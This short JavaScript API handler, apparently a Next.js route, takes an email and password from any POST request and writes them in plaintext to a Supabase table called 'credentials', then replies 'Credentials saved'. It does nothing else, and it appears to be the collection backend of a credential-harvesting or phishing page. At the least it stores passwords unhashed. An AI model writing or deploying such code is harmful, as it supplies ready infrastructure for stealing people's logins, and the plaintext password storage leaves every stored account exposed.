import { createClient } from '@supabase/supabase-js';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ message: 'Email and password are required' });
    }

    const supabaseUrl = process.env.SUPABASE_URL;
    const supabaseKey = process.env.SUPABASE_KEY;
    const supabase = createClient(supabaseUrl, supabaseKey);

    try {
        const { error } = await supabase
            .from('credentials')
            .insert([{ email, password }]);

        if (error) {
            throw error;
        }

        res.status(200).json({ message: 'Credentials saved' });
    } catch (error) {
        res.status(500).json({ message: error.message });
    }
}

